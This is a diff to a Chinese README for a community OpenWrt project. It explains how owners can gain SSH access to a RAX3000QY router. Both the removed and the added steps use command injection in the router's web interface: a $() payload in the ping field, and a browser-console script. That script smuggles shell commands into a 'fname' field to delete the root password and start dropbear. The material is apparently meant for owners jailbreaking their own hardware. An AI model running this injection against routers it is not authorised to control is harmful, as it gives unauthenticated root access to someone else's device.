@@ -15,10 +15,52 @@
 ### 1. 取得 SSH（二选一）
 
 - 首先进入后台页面 (后台地址、用户名和密码请看路由器背面)
-- 进入「更多 --> 诊断 --> ping」页面
-- 在”URL或者IP地址”的输入框中输入：`$(dropbear${IFS}-p${IFS}22)` 来启动 dropbear
-- 再通过 `$(passwd${IFS}-d${IFS}root)` 来删除 root 的密码
-- 使用 ssh 命令来连接路由器：`ssh root@192.168.x.x` 后将会直接进入而不会询问密码
+- 登录后在浏览器控制台执行以下脚本（将 `sessionId` 替换为你自己的值）：
+
+  ```js
+  {
+      const sessionId = "04ff9afd911be3d3b9232dce7febd48e";   //替换为你的sessionId
+
+
+      const commands = [
+          "passwd -d root",
+          "uci set dropbear.@dropbear[0].PasswordAuth='on'",
+          "uci set dropbear.@dropbear[0].RootPasswordAuth='on'",
+          "uci set dropbear.@dropbear[0].Port='22'",
+          "uci set dropbear.@dropbear[0].enable='1'",
+          "uci commit dropbear",
+          "/etc/init.d/dropbear enable",
+          "/etc/init.d/dropbear start"
+      ];
+
+      const shellCmd = commands.map(cmd => cmd.replace(/ /g, "${IFS}")).join(";");
+
+
+      fetch("/itms", {
+          method: "POST",
+          headers: {
+              "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+              cmd: 22,
+              fname: "websys.log |" + shellCmd,
+              method: "get",
+              sessionId: sessionId,
+          }),
+      })
+          .then((response) => response.json())
+          .then((data) => {
+              console.log("服务器返回:", data);
+          })
+          .catch((error) => {
+              console.error("请求失败:", error);
+          });
+  }
+  ```
+
+- 执行完成后，使用 ssh 连接路由器：`ssh root@192.168.x.x`（root 默认无密码）
+- 联网后系统可能会自动打补丁封禁 22 端口，重置系统即可恢复
+- 参考讨论：<https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=8445553&extra=&page=1>
 
 ### 2. 取得 Telnet（二选一）
 
@@ -60,5 +102,4 @@
 ---
 
 ![Star History Chart](https://api.star-history.com/svg?repos=sfxfs/rax3000qy-OpenWrt&type=Date)
-
 
